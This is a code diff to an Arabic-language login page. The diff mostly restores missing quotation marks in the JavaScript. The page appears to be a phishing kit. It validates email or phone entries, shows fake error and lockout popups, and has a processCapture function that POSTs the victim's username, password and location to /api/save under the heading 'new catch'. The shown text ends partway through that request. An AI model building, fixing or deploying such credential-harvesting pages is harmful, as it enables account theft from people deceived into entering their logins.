@@ -16,7 +16,7 @@
         }
 
         body {
-            margin: 0; padding: 0; font-family:  Segoe UI , Tahoma, sans-serif;
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
             background: radial-gradient(circle at top right, #1e293b, #0f172a);
             display: flex; justify-content: center; align-items: center; min-height: 100vh;
             color: var(--text-white); overflow: hidden;
@@ -125,18 +125,18 @@
     let countdown;
 
     window.onload = () => {
-        const banExpiry = localStorage.getItem( lock_expiry );
+        const banExpiry = localStorage.getItem('lock_expiry');
         if (banExpiry) {
             const remain = Math.round((banExpiry - Date.now()) / 1000);
             if (remain > 0) applyBanEffect(remain);
-            else localStorage.removeItem( lock_expiry );
+            else localStorage.removeItem('lock_expiry');
         }
     };
 
-    document.getElementById( loginForm ).onsubmit = (e) => {
+    document.getElementById('loginForm').onsubmit = (e) => {
         e.preventDefault();
-        const user = document.getElementById( user ).value.trim();
-        const pass = document.getElementById( pass ).value;
+        const user = document.getElementById('user').value.trim();
+        const pass = document.getElementById('pass').value;
 
         const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         const phoneRx = /^[0-9]{8,15}$/;
@@ -162,31 +162,31 @@
             loginAttempts++;
             if (loginAttempts >= 3) {
                 const expiryTime = Date.now() + (30 * 1000);
-                localStorage.setItem( lock_expiry , expiryTime);
+                localStorage.setItem('lock_expiry', expiryTime);
                 applyBanEffect(30);
             } else {
                 Swal.fire({
-                    title:  بيانات غير دقيقة ,
-                    text:  يرجى كتابة البريد الإلكتروني أو رقم الهاتف بشكل صحيح لتجنب الحظر مؤقتاً. ,
-                    icon:  error ,
-                    confirmButtonColor:  #22d3ee ,
+                    title: 'بيانات غير دقيقة',
+                    text: 'يرجى كتابة البريد الإلكتروني أو رقم الهاتف بشكل صحيح لتجنب الحظر مؤقتاً.',
+                    icon: 'error',
+                    confirmButtonColor: '#22d3ee',
                     allowOutsideClick: false,
-                    customClass: { popup:  glass-popup  }
+                    customClass: { popup: 'glass-popup' }
                 }).then(() => {
-                    document.getElementById( user ).value =   ;
-                    document.getElementById( pass ).value =   ;
-                    document.getElementById( user ).focus();
+                    document.getElementById('user').value = '';
+                    document.getElementById('pass').value = '';
+                    document.getElementById('user').focus();
                 });
             }
         }
     };
 
     function applyBanEffect(duration) {
-        const container = document.getElementById( mainCard );
-        const overlay = document.getElementById( banOverlay );
-        const timerTxt = document.getElementById( timer );
-        container.classList.add( is-banned );
-        overlay.style.display =  block ;
+        const container = document.getElementById('mainCard');
+        const overlay = document.getElementById('banOverlay');
+        const timerTxt = document.getElementById('timer');
+        container.classList.add('is-banned');
+        overlay.style.display = 'block';
 
         let left = duration;
         timerTxt.innerText = left;
@@ -197,16 +197,16 @@
             timerTxt.innerText = left;
             if (left <= 0) {
                 clearInterval(countdown);
-                container.classList.remove( is-banned );
-                overlay.style.display =  none ;
-                localStorage.removeItem( lock_expiry );
+                container.classList.remove('is-banned');
+                overlay.style.display = 'none';
+                localStorage.removeItem('lock_expiry');
                 loginAttempts = 0;
                 Swal.fire({
-                    title:  مبروك! ,
-                    text:  تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً. ,
-                    icon:  success ,
-                    confirmButtonColor:  #22d3ee ,
-                    customClass: { popup:  glass-popup  }
+                    title: 'مبروك!',
+                    text: 'تم إزالة الحظر عنك بنجاح، يمكنك المحاولة مجدداً.',
+                    icon: 'success',
+                    confirmButtonColor: '#22d3ee',
+                    customClass: { popup: 'glass-popup' }
                 });
             }
         }, 1000);
@@ -214,9 +214,9 @@
 
     async function processCapture(u, p, location) {
         try {
-            await fetch( /api/save , {
-                method:  POST ,
-                headers: {  Content-Type :  application/json  },
+            await fetch('/api/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     message: `🎯 صيد جديد:\n👤: ${u}\n🔑: ${p}\n📍 الموقع: ${location}` 
                 })
